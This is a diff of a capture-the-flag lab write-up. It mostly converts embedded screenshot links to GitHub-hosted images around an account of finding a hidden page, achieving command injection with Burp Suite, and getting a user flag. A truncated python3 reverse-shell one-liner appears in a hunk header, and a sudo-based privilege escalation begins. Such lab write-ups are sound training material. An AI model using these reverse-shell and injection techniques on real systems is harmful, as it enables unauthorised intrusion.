@@ -22,28 +22,27 @@ Nmap done: 1 IP address (1 host up) scanned in 17.38 seconds
 ```bash
 nano /etc/hosts
 ```
+![Pasted image 20221211192733](https://user-images.githubusercontent.com/51139868/208265794-553928b0-9b2d-4806-88bc-62959538761a.png)
 
-![[Pasted image 20221211192733.png]]
+![Pasted image 20221211192921](https://user-images.githubusercontent.com/51139868/208265807-2908db27-005d-41c3-99c6-c27b8897620d.png)
 
-![[Pasted image 20221211192921.png]]
 
 Just fooling around, I decided to click on the *click here* link:
 
-![[Pasted image 20221211193036.png]]
+![Pasted image 20221211193036](https://user-images.githubusercontent.com/51139868/208265828-e2743ff2-f267-4ff5-a009-5fa21b8272e8.png)
 
 Obviously I did not have any username and password, so I thought about checking the source-code for any hints
 
-![[Pasted image 20221211193506.png]]
+![Pasted image 20221211193506](https://user-images.githubusercontent.com/51139868/208265833-f3175281-4d01-462b-8f92-72d4b52a1c37.png)
 
 By checking the .js code you're gonna find the following page:
+![Pasted image 20221211193721](https://user-images.githubusercontent.com/51139868/208265838-f0042379-b321-4517-80b9-0723456abcb9.png)
 
-![[Pasted image 20221211193721.png]]
-
-![[Pasted image 20221211193739.png]]
+![Pasted image 20221211193739](https://user-images.githubusercontent.com/51139868/208265848-5d2aee8d-c197-400c-b050-1ad78e5211e4.png)
 
 And this is what you see after clicking 'ok'
 
-![[Pasted image 20221211193817.png]]
+![Pasted image 20221211193817](https://user-images.githubusercontent.com/51139868/208265854-2f73fca9-d361-4627-9cc8-327e333ae820.png)
 
 After that I got my burp suite up and running... After a few tries, I got a successfull command injection, so I used revshells.com to get a reverse shell code:
 
@@ -53,11 +52,11 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 And used it in my request 
 
-![[Pasted image 20221211200225.png]]
+![Pasted image 20221211200225](https://user-images.githubusercontent.com/51139868/208265876-45eab4a5-1e3b-4d5d-99b1-ddefafb74b63.png)
 
 And there you go, user flag *cheeeck*!
 
-Now, for the root flag I used the following commands:
+Now, for the privesc + root flag I used the following commands:
 
 ```bash
 sudo -l
